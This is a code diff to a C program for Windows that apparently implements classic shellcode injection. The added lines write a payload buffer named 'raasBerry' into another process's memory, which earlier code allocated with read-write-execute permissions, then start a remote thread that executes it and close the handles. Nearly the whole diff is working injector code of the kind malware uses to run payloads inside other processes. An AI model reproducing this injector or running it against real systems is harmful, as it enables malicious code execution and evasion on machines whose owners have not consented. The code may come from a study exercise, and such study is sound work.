@@ -8,7 +8,7 @@ const char* k = "[+]";
 const char* e = "[-]";
 const char* i = "[*]";
 
-DWORD PID = NULL; 
+DWORD PID, TID = NULL; 
 HANDLE hProcess = NULL;
 HANDLE hThread = NULL;
 LPVOID rBuffer = NULL;
@@ -46,9 +46,32 @@ int main(int argc, char* argv[]) {
     printf("%s allcoated %zu-bytes with rwx permissions\n", k, sizeof(raasBerry)); // comment me
 
 // Write the contents of the shellcode to that buffer in the process memory
+    
+    WriteProcessMemory(hProcess, rBuffer, raasBerry, sizeof(raasBerry), NULL );
+    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(raasBerry)); // comment me
 
 // Create a thread that will run in allocated memory and written into the process
-    
+    hThread = CreateRemoteThreadEx(
+        hProcess,
+        NULL,
+        0, //stack size
+        (LPTHREAD_START_ROUTINE)rBuffer,
+        NULL, 
+        0,  // run thread immediately
+        0,
+        &TID);
+
+    if (hThread == NULL){
+        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    };
+
+    WaitForSingleObject(hThread, INFINITE); //sounds like trouble waiting to happen ;)
+
+    // cleaning
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
     return EXIT_SUCCESS;
 
 }
